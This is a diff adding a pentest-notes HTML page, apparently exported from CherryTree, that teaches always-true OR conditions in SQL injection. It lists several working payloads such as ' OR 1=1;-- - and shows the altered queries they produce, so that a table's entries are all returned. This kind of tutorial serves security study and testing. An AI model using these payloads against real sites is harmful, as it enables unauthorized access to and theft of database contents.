@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Always True contion 'OR': extract all entries in the table</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Always True contion 'OR': extract all entries in the table</h1><br/><strong><h3>Usually used for:</h3></strong><br />• <a href="on_Test_Methodology--WebApp_Pentest--Exploitation--Server-side--SQL_injections(SQLi)--Visibility_of_SQLi--In-Band-Inline-UNION_based_SQLi.html">In-Band/Inline based SQLi</a><br />• <a href="ology--WebApp_Pentest--Exploitation--Server-side--SQL_injections(SQLi)--Visibility_of_SQLi--Blind_SQLi_Boolean-Binary_Based_SQL_injection.html">Blind SQLi: Boolean/Binary Based SQL injection</a><br /><br /><br /><span style="text-decoration:underline;">If we use OR we can insert a random value</span><br />   Because of the condition <span style="color:#f6ff00;">&#39;1&#39;=&#39;1</span>&#39;  is always true, it tells to the database to select all the entries in the Products table!<br />The query behind the page could be something like this: <br /><code>SELECT &lt;some fields&gt; FROM &lt;some table&gt; WHERE id=&#39;</code><code><span style="color:#ff8700;">GETID</span></code><code>&#39;;</code><br />   ◇ [RandomValue]&#39; OR 1;#<br />      ▪ <code>SELECT &lt;some fields&gt; FROM &lt;some table&gt; WHERE id=&#39;</code><code><span style="color:#ff8700;">123&#39; OR 1;#</span></code><code>&#39;;</code><br />   ◇ [RandomValue]&#39; OR 1=1;-- -<br />      ▪ <code>SELECT &lt;some fields&gt; FROM &lt;some table&gt; WHERE id=&#39;</code><code><span style="color:#ff8700;">123&#39; OR 1=1;-- -</span></code><code>&#39;;</code><br />   ◇ [RandomValue]&#39; OR 2=2;-- -<br />      ▪ <code>SELECT &lt;some fields&gt; FROM &lt;some table&gt; WHERE id=&#39;</code><code><span style="color:#ff8700;">123&#39; OR 2=2;-- -</span></code><code>&#39;;</code><br />   ◇ [RandomValue]&#39; OR ‘1’=&#39;1<br />      ▪ <code>SELECT &lt;some fields&gt; FROM &lt;some table&gt; WHERE id=&#39;</code><code><span style="color:#ff8700;">123&#39; OR ‘1’=&#39;1</span></code><code>&#39;;</code><br />   <br />    <br /><span style="color:#a5452a;">example  </span>  <br />    <a href=""><img src="images/359-1.png" alt="images/359-1.png" /></a><br />    <a href=""><img src="images/359-2.png" alt="images/359-2.png" /></a><br />    This give use us all the result!</div>
+</body>
+</html>
